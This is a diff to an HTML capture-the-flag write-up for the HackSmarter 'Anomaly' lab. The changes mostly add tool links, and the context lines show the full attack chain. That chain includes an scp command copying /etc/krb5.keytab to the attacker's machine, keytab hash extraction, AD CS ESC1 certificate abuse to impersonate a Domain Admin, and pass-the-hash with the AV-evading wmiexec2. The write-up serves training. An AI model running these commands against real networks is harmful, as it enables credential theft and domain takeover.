@@ -21,7 +21,7 @@
 
   <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
   <link rel="apple-touch-icon" href="../assets/favicon.png" />
-  <link rel="stylesheet" href="../style.css?v=4"/>
+  <link rel="stylesheet" href="../style.css?v=5"/>
   <style>
     /* Machine info box styling */
     .machine-info {
@@ -203,6 +203,7 @@
     <ul>
       <li><strong>Platform:</strong> HackSmarter Labs</li>
       <li><strong>Difficulty:</strong> <span class="difficulty-medium">Medium</span></li>
+      <li><strong>OS:</strong> Ubuntu Linux / Windows Server 2022</li>
       <li><strong>Key Topics:</strong> Jenkins RCE, Kerberos Keytab, AD CS ESC1/ESC4, Pass-the-Hash</li>
     </ul>
   </div>
@@ -219,7 +220,7 @@
   <h2>Reconnaissance</h2>
 
   <h3><span class="step">[Step 1]</span> Ubuntu Server Enumeration</h3>
-  <p>I started with a full port scan against the Ubuntu server:</p>
+  <p>I started with a full port scan against the Ubuntu server using <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a>:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV 10.1.167.185 -oN nmap_scan_ubuntu</code></pre>
 
   <pre><code>PORT     STATE SERVICE VERSION
@@ -399,7 +400,7 @@ Valid starting     Expires            Service principal
 # scp -P 2222 /etc/krb5.keytab kali@10.200.26.123:/tmp/</code></pre>
 
   <h3><span class="step">[Step 12]</span> Extracting Hashes from Keytab</h3>
-  <p>Using <code>keytabextract.py</code> from the KeyTabExtract tool, I extracted the AES256 hash:</p>
+  <p>Using <code>keytabextract.py</code> from <a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noopener noreferrer">KeyTabExtract</a>, I extracted the AES256 hash:</p>
 
   <pre><code>$ python3 keytabextract.py /tmp/krb5.keytab
 [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
@@ -418,7 +419,7 @@ Valid starting     Expires            Service principal
   <p><img src="../assets/anomaly/kerberos-smb-auth.png" alt="Successful SMB authentication using Kerberos ticket"></p>
 
   <h3><span class="step">[Step 14]</span> User Enumeration via SMB</h3>
-  <p>Using NetExec with Kerberos authentication, I enumerated domain users:</p>
+  <p>Using <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a> with Kerberos authentication, I enumerated domain users:</p>
 
   <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd --use-kcache --users</code></pre>
 
@@ -445,16 +446,16 @@ anna_molly         2025-11-12 20:29:16 0</code></pre>
 SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:[REDACTED]</code></pre>
 
   <h3><span class="step">[Step 16]</span> BloodHound Collection</h3>
-  <p>I collected Active Directory data for analysis:</p>
+  <p>I collected Active Directory data for <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> analysis:</p>
 
   <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' --bloodhound --collection All --dns-server 10.1.111.50</code></pre>
 
-  <p>BloodHound analysis did not reveal any direct privilege escalation paths, so I pivoted to checking for AD CS vulnerabilities.</p>
+  <p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> analysis did not reveal any direct privilege escalation paths, so I pivoted to checking for AD CS vulnerabilities.</p>
 
   <h2>Domain Privilege Escalation - AD CS Exploitation</h2>
 
   <h3><span class="step">[Step 17]</span> Certificate Template Enumeration</h3>
-  <p>Using Certipy, I scanned for vulnerable certificate templates:</p>
+  <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>, I scanned for vulnerable certificate templates:</p>
 
   <pre><code>$ certipy find -u Brandon_Boyd@anomaly.hsm -p '[REDACTED]' -dc-ip 10.1.111.50 -vulnerable</code></pre>
 
@@ -495,6 +496,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:[REDACTED]</
   <p>The <code>CertAdmin</code> template is vulnerable, and <code>Domain Computers</code> have the necessary permissions to exploit it.</p>
 
   <h3><span class="step">[Step 18]</span> Checking Machine Account Quota</h3>
+  <p>Using <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a>:</p>
   <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' -M maq
 MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
 
@@ -506,6 +508,7 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
   </div>
 
   <h3><span class="step">[Step 19]</span> Adding a Computer Account</h3>
+  <p>Using <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a>:</p>
   <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass 'Zerotrace123!' \
     ANOMALY.HSM/Brandon_Boyd:'[REDACTED]' -dc-ip 10.1.111.50
 [*] Successfully added machine account BRANDON-PC$ with password Zerotrace123!.</code></pre>
@@ -515,7 +518,7 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
 SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!</code></pre>
 
   <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
-  <p>I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
+  <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>, I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
 
   <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
@@ -528,11 +531,12 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <p>The <code>KDC_ERR_CLIENT_REVOKED</code> error indicates the Administrator account is disabled or locked.</p>
 
   <h3><span class="step">[Step 21]</span> Finding Alternative Domain Admin</h3>
-  <p>Using BloodHound, I identified another Domain Admin: <code>anna_molly</code>.</p>
+  <p>Using <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a>, I identified another Domain Admin: <code>anna_molly</code>.</p>
 
   <p><img src="../assets/anomaly/bloodhound-anna-molly.png" alt="BloodHound showing anna_molly as Domain Admin with SID"></p>
 
   <h3><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
+  <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>:</p>
   <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
     -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
@@ -560,16 +564,16 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
   <h2>Domain Controller Access - AV Evasion</h2>
 
   <h3><span class="step">[Step 24]</span> Using wmiexec2 for Evasion</h3>
-  <p>Since the Domain Controller has active antivirus, I used <code>wmiexec2</code>, an obfuscated version of wmiexec designed to evade detection.</p>
+  <p>Since the Domain Controller has active antivirus, I used <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a>, an obfuscated version of wmiexec designed to evade detection.</p>
 
   <div class="question">
     <strong>Why wmiexec2?</strong>
   </div>
   <div class="answer">
-    Standard tools like psexec or wmiexec have well-known signatures that most AV solutions detect. wmiexec2 uses obfuscation techniques to bypass these detections while maintaining the same functionality.
+    Standard tools like psexec or wmiexec have well-known signatures that most AV solutions detect. <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a> uses obfuscation techniques to bypass these detections while maintaining the same functionality.
   </div>
 
-  <p><strong>Tool:</strong> <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2 on GitHub</a></p>
+  <p><strong>Tool:</strong> <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2 on GitHub</a></p>
 
   <pre><code>$ python3 wmiexec2.py anomaly.hsm/anna_molly@10.1.111.50 \
     -hashes aad3b435b51404eeaad3b435b51404ee:[REDACTED]
@@ -595,13 +599,13 @@ C:\Users\Administrator\Desktop> type root.txt
 
   <h2>Tools Used</h2>
   <ul class="tools-grid">
-    <li><a href="https://nmap.org/" target="_blank" rel="noopener">Nmap</a> - Network scanning</li>
-    <li><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">NetExec (nxc)</a> - SMB/LDAP enumeration</li>
-    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy</a> - AD CS enumeration and exploitation</li>
-    <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a> - addcomputer.py for machine account creation</li>
-    <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> - Active Directory attack path analysis</li>
-    <li><a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noopener">KeyTabExtract</a> - Kerberos keytab hash extraction</li>
-    <li><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2</a> - AV-evasive WMI execution</li>
+    <li><a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> - Network scanning</li>
+    <li><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec (nxc)</a> - SMB/LDAP enumeration</li>
+    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a> - AD CS enumeration and exploitation</li>
+    <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> - addcomputer.py for machine account creation</li>
+    <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> - Active Directory attack path analysis</li>
+    <li><a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noopener noreferrer">KeyTabExtract</a> - Kerberos keytab hash extraction</li>
+    <li><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a> - AV-evasive WMI execution</li>
   </ul>
 
   <h2>Attack Path Summary</h2>
